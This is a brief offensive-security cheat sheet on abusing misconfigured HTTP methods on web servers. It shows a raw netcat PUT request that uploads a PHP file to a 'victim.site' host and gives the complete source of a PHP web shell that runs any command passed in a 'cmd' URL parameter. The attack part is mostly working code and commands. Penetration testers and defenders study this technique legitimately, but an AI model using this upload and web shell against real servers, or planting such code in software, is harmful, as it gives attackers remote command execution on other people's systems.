# Using http verbs/methods to exploit misconfigured webapps:

verbs:
- `HEAD` (used to get the response headers)
- `GET` (used to request resources like web pages, images)
- `POST` (used to submit html form data)
- `PUT` (used to upload a file to the server)
- `DELETE` (used to remove a file from the server)
- `OPTIONS` (used to check the web server for enabled http verbs)


### Exploit DELETE verb:
- `DELETE /path/to/resource.txt`

### Exploit PUT verb:
you have to know the size of the file you want to upload on the server.
for that we can use the unix utility `wc`.

Command: `wc -m payload.php`
Response: `20 payload.php`
```php
$ nc victim.site 80 
PUT /payload.php HTTP/1.0
Content-type: text/html
Content-length: 20

<?php phpinfo(); ?>
```

- Uploading PHP Shell:
```php
<?php 
if (isset($_GET['cmd']))
{
	$cmd = $_GET['cmd'];
	echo '<pre>';
	$result = shell_exec($cmd);
	echo $result;
	echo '</pre>';
}
?>
```

### The PHP Shell in use: 
![Pasted image 20220124080435](https://user-images.githubusercontent.com/33517160/156137337-85b71439-6f42-40df-aec9-8afc7a560913.png)

**By 0xRar**
